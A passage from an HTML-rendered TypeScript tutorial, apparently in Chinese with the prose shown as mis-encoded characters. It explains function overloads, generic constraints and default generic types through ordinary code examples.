class="hljs-string">&quot;abc&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§å·¥ç¨‹æ¡ˆä¾‹</strong></p><p>API è¯·æ±‚é‡è½½ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç®€å•GETè¯·æ±‚</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">request</span>(<span class="hljs-params"><span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Response</span>&gt;;<br><br><span class="hljs-comment">// å¸¦å‚æ•°çš„GETè¯·æ±‚</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">request</span>(<span class="hljs-params"><span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">params</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Response</span>&gt;;<br><br><span class="hljs-comment">// POSTè¯·æ±‚</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">request</span>(<span class="hljs-params"><span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-attr">body</span>: <span class="hljs-built_in">object</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Response</span>&gt;;<br><br><span class="hljs-comment">// å®ç°</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">request</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,</span><br><span class="hljs-params">  <span class="hljs-attr">paramsOrMethod</span>?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; | <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="hljs-params">  <span class="hljs-attr">body</span>?: <span class="hljs-built_in">object</span></span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Response</span>&gt; &#123;<br>  <span class="hljs-keyword">if</span> (paramsOrMethod === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> paramsOrMethod === <span class="hljs-string">&quot;object&quot;</span>) &#123;<br>    <span class="hljs-keyword">const</span> query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(paramsOrMethod).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;url&#125;</span>?<span class="hljs-subst">$&#123;query&#125;</span>`</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (paramsOrMethod === <span class="hljs-string">&quot;POST&quot;</span> &amp;&amp; body) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url, &#123;<br>      <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(body)<br>    &#125;);<br>  &#125;<br>  <br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Invalid arguments&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-3-3-æ³›å‹çº¦æŸä¸é»˜è®¤ç±»å‹"><a href="#1-3-3-æ³›å‹çº¦æŸä¸é»˜è®¤ç±»å‹" class="headerlink" title="1.3.3 æ³›å‹çº¦æŸä¸é»˜è®¤ç±»å‹"></a>1.3.3 æ³›å‹çº¦æŸä¸é»˜è®¤ç±»å‹</h3><p><strong>æ³›å‹çº¦æŸï¼ˆGeneric Constraintsï¼‰</strong></p><p>æ ¸å¿ƒç›®çš„ï¼šé™åˆ¶æ³›å‹å‚æ•°å¿…é¡»æ»¡è¶³ç‰¹å®šæ¡ä»¶</p><p>åŸºç¡€è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> identity&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ConstraintType</span>&gt;(<span class="hljs-attr">arg</span>: T): T &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åŸºæœ¬çº¦æŸç¤ºä¾‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> &#123;<br>  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// T å¿…é¡»åŒ…å« length å±æ€§</span><br><span class="hljs-keyword">function</span> logLength&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arg.<span class="hljs-property">length</span>);<br>  <span class="hljs-keyword">return</span> arg;<br>&#125;<br><br><span class="hljs-title function_">logLength</span>(<span class="hljs-string">&quot;hello&quot;</span>); <span class="hljs-comment">// âœ… å­—ç¬¦ä¸²æœ‰ length</span><br><span class="hljs-title function_">logLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// âœ… æ•°ç»„æœ‰ length</span><br><span class="hljs-title function_">logLength</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼æ•°å­—æ²¡æœ‰ length</span><br></code></pre></td></tr></table></figure><p><strong>å¤šçº¦æŸæ¡ä»¶</strong></p><p>ä½¿ç”¨ &amp; è¿ç®—ç¬¦ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> &#123;<br>  <span class="hljs-title function_">print</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Loggable</span> &#123;<br>  <span class="hljs-title function_">log</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// T å¿…é¡»åŒæ—¶æ»¡è¶³ Printable å’Œ Loggable</span><br><span class="hljs-keyword">function</span> processItem&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Printable</span> &amp; <span class="hljs-title class_">Loggable</span>&gt;(<span class="hljs-attr">item</span>: T) &#123;<br>  item.<span class="hljs-title function_">print</span>();<br>  item.<span class="hljs-title function_">log</span>();<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Document</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Printable</span>, <span class="hljs-title class_">Loggable</span> &#123;<br>  <span class="hljs-title function_">print</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Printing document&quot;</span>); &#125;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Logging document&quot;</span>); &#125;<br>&#125;<br><br><span class="hljs-title function_">processItem</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Document</span>()); <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p><strong>ç±»å‹å‚æ•°çº¦æŸ</strong></p><p>çº¦æŸæ³›å‹å‚æ•°ä¹‹é—´çš„å…³ç³»ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç¡®ä¿ K æ˜¯ T çš„é”®å</span><br><span class="hljs-keyword">function</span> getProperty&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">obj</span>: T, <span class="hljs-attr">key</span>: K) &#123;<br>  <span class="hljs-keyword">return</span> obj[key];<br>&#125;<br><br><span class="hljs-keyword">const</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;;<br><span class="hljs-title function_">getProperty</span>(person, <span class="hljs-string">&quot;name&quot;</span>); <span class="hljs-comment">// âœ…</span><br><span class="hljs-title function_">getProperty</span>(person, <span class="hljs-string">&quot;email&quot;</span>); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼ä¸å­˜åœ¨è¯¥å±æ€§</span><br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°çº¦æŸï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¦æ±‚æ³›å‹ T å¿…é¡»å¯æ„é€ </span><br><span class="hljs-keyword">function</span> createInstance&lt;T <span class="hljs-keyword">extends</span> &#123; <span class="hljs-title function_">new</span> (): <span class="hljs-title class_">InstanceType</span> &#125;&gt;(<span class="hljs-attr">ctor</span>: T) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>();<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;&#125;<br><span class="hljs-keyword">const</span> instance = <span class="hljs-title function_">createInstance</span>(<span class="hljs-title class_">MyClass</span>); <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p><strong>æ³›å‹é»˜è®¤ç±»å‹ï¼ˆDefault Typesï¼‰</strong></p><p>æ ¸å¿ƒç›®çš„ï¼šä¸ºæ³›å‹å‚æ•°æä¾›é»˜è®¤å€¼ï¼Œç®€åŒ–ä½¿ç”¨</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span>&lt;T = <span class="hljs-built_in">any</span>&gt; &#123;<br>  <span class="hljs-attr">data</span>: T;<br>  <span class="hljs-attr">status</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨é»˜è®¤ç±»å‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">response</span>: <span class="hljs-title class_">ApiResponse</span> = &#123; <br>  <span class="hljs-attr">data</span>: <span class="hljs-string">&quot;untyped data&quot;</span>, <span class="hljs-comment">// any ç±»å‹</span><br>  <span class="hljs-attr">status</span>: <span class="hljs-number">200</span><br>&#125;;<br><br><span class="hljs-comment">// æ˜¾å¼æŒ‡å®šç±»å‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">userResponse</span>: <span class="hljs-title class_">ApiResponse</span>&lt;<span class="hljs-title class_">User</span>&gt; = &#123;<br>  <span class="hljs-attr">data</span>: &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;,<br>  <span class="hljs-attr">status</span>: <span class="hljs-number">200</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>çº¦æŸä¸é»˜è®¤ç±»å‹ç»„åˆ</strong></p><p>å¤æ‚åœºæ™¯åº”ç”¨ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 1. çº¦æŸ + é»˜è®¤ç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PaginatedResult</span>&lt;T = <span class="hljs-built_in">object</span>&gt; &#123;<br>  <span class="hljs-attr">items</span>: T[];<br>  <span class="hljs-attr">total</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// 2. å‡½æ•°ä¸­ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> fetchData&lt;T <span class="hljs-keyword">extends</span> &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125; = &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125;&gt;(<br>  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span><br>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">PaginatedResult</span>&lt;T&gt;&gt; &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨é»˜è®¤çº¦æŸ</span><br><span class="hljs-title function_">fetchData</span>(<span class="hljs-string">&quot;/users&quot;</span>); <span class="hljs-comment">// Promise&lt;PaginatedResult&lt;&#123; id: string &#125;&gt;&gt;</span><br><br><span class="hljs-comment">// æŒ‡å®šå…·ä½“ç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Product</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br>fetchData&lt;<span class="hljs-title class_">Product</span>&gt;(<span class="hljs-string">&quot;/products&quot;</span>); <span class="hljs-comment">// Promise&lt;PaginatedResult&lt;Product&gt;&gt;</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µæ¨¡å¼</strong></p><p>æ¨¡å¼1ï¼šéƒ¨åˆ†å±æ€§è¦æ±‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¦æ±‚å¯¹è±¡è‡³å°‘åŒ…å«ç‰¹å®šå±æ€§</span><br><span class="hljs-keyword">function</span> updateRecord&lt;T <span class="hljs-keyword">extends</span> &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125;&gt;(<span class="hljs-attr">record</span>: T) &#123;<br>  db.<span class="hljs-title function_">save</span>(record.<span class="hljs-property">id</span>, record);<br>&#125;<br><br><span class="hljs-comment">// å…è®¸é¢å¤–å±æ€§</span><br><span class="hljs-title function_">updateRecord</span>(&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;); <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p>æ¨¡å¼2ï¼šå·¥å‚å‡½æ•°çº¦æŸ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¦æ±‚ç±»æ„é€ å‡½æ•°</span><br><span class="hljs-keyword">function</span> create&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt;(<br>  <span class="hljs-title class_">Ctor</span>: T,<br>  ...<span class="hljs-attr">args</span>: <span class="hljs-title class_">ConstructorParameters</span>&lt;T&gt;<br>): <span class="hljs-title class_">InstanceType</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(...args);<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> w = <span class="hljs-title function_">create</span>(<span class="hljs-title class_">Widget</span>, <span class="hljs-string">&quot;MyWidget&quot;</span>); <span class="hljs-comment">// Widget å®ä¾‹</span><br></code></pre></td></tr></table></figure><p>æ¨¡å¼3ï¼šAPI å“åº”æ ‡å‡†åŒ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span>&lt;T = <span class="hljs-built_in">unknown</span>, E = <span class="hljs-title class_">Error</span>&gt; &#123;<br>  <span class="hljs-attr">success</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-attr">data</span>?: T;<br>  <span class="hljs-attr">error</span>?: E;<br>  <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> createResponse&lt;T&gt;(<span class="hljs-attr">data</span>: T): <span class="hljs-title class_">ApiResponse</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,<br>    data,<br>    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> userResponse = <span class="hljs-title function_">createResponse</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;); <span class="hljs-comment">// ApiResponse&lt;&#123; name: string &#125;&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><ol><li>é¿å…è¿‡åº¦çº¦æŸï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¿‡åº¦çº¦æŸï¼šé™åˆ¶ä¸ºç‰¹å®šç±»å‹</span><br><span class="hljs-keyword">function</span> process&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>&gt;(<span class="hljs-attr">input</span>: T): T &#123; ... &#125;<br><br><span class="hljs-comment">// æ¨èï¼šæ›´çµæ´»çš„çº¦æŸ</span><br><span class="hljs-keyword">function</span> process&lt;T&gt;(<span class="hljs-attr">input</span>: T): T &#123; ... &#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>åˆç†ä½¿ç”¨é»˜è®¤ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸ºå¸¸ç”¨ç±»å‹æä¾›é»˜è®¤å€¼</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Formatter</span>&lt;T = <span class="hljs-built_in">string</span>&gt; = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">input</span>: T</span>) =&gt;</span> <span class="hljs-built_in">string</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">dateFormatter</span>: <span class="hljs-title class_">Formatter</span>&lt;<span class="hljs-title class_">Date</span>&gt; = <span class="hljs-function"><span class="hljs-params">date</span> =&gt;</span> date.<span class="hljs-title function_">toISOString</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-attr">defaultFormatter</span>: <span class="hljs-title class_">Formatter</span> = <span class="hljs-function"><span class="hljs-params">str</span> =&gt;</span> str.<span class="hljs-title function_">toUpperCase</span>(); <span class="hljs-comment">// é»˜è®¤ string</span><br></code></pre></td></tr></table></figure><ol start="3"><li>çº¦æŸæ–‡æ¡£åŒ–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åˆå¹¶ä¸¤ä¸ªå¯¹è±¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@template</span> <span class="hljs-variable">T</span> - ç¬¬ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@template</span> <span class="hljs-variable">U</span> - ç¬¬äºŒä¸ªå¯¹è±¡çš„ç±»å‹ï¼ˆå¿…é¡»ä¸Tå…¼å®¹ï¼‰</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">function</span> merge&lt;T, U <span class="hljs-keyword">extends</span> T&gt;(<span class="hljs-attr">obj1</span>: T, <span class="hljs-attr">obj2</span>: U): T &amp; U &#123;<br>  <span class="hljs-keyword">return</span> &#123; ...obj1, ...obj2 &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>ç±»å‹å‚æ•°å‘½åçº¦å®šï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨æœ‰æ„ä¹‰çš„ç±»å‹å‚æ•°å</span><br><span class="hljs-keyword">function</span> getValue&lt;<span class="hljs-title class_">TObject</span>, <span class="hljs-title class_">TKey</span> <span class="hljs-keyword">extends</span> keyof <span class="hljs-title class_">TObject</span>&gt;(<br>  <span class="hljs-attr">obj</span>: <span class="hljs-title class_">TObject</span>, <br>  <span class="hljs-attr">key</span>: <span class="hljs-title class_">TKey</span><br>): <span class="hljs-title class_">TObject</span>[<span class="hljs-title class_">TKey</span>] &#123;<br>  <span class="hljs-keyword">return</span> obj[key];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤æ‚çº¦æŸæ¡ˆä¾‹</strong></p><p>é€’å½’çº¦æŸï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ‘èŠ‚ç‚¹ç»“æ„çº¦æŸ</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">children</span>?: <span class="hljs-title class_">TreeNode</span>[];<br>&#125;<br><br><span class="hljs-keyword">function</span> walkTree&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TreeNode</span>&gt;(<span class="hljs-attr">node</span>: T) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(node.<span class="hljs-property">id</span>);<br>  node.<span class="hljs-property">children</span>?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">walkTree</span>(child));<br>&#125;<br><br><span class="hljs-keyword">const</span> tree = &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;root&quot;</span>,<br>  <span class="hljs-attr">children</span>: [<br>    &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;child1&quot;</span> &#125;,<br>    &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;child2&quot;</span>, <span class="hljs-attr">children</span>: [&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;grandchild&quot;</span> &#125;] &#125;<br>  ]<br>&#125;;<br><span class="hljs-title function_">walkTree</span>(tree); <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p>æ¡ä»¶ç±»å‹çº¦æŸï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç¡®ä¿æ³›å‹æ˜¯å‡½æ•°ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnTypeOrNever</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">function</span> getReturnType&lt;T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt;(<br>  <span class="hljs-attr">fn</span>: T<br>): <span class="hljs-title class_">ReturnTypeOrNever</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fn</span>() <span class="hljs-keyword">as</span> <span class="hljs-title class_">ReturnTypeOrNever</span>&lt;T&gt;;<br>&#125;<br><br><span class="hljs-keyword">const</span> str = <span class="hljs-title function_">getReturnType</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">&quot;hello&quot;</span>); <span class="hljs-comment">// string</span><br><span class="hljs-keyword">const</span> num = <span class="hljs-title function_">getReturnType</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-number">123</span>); <span class="hljs-comment">// number</span><br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é”™è¯¯è§£å†³æ–¹æ¡ˆ</strong></p><p>é”™è¯¯ï¼šçº¦æŸä¸æ»¡è¶³</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span 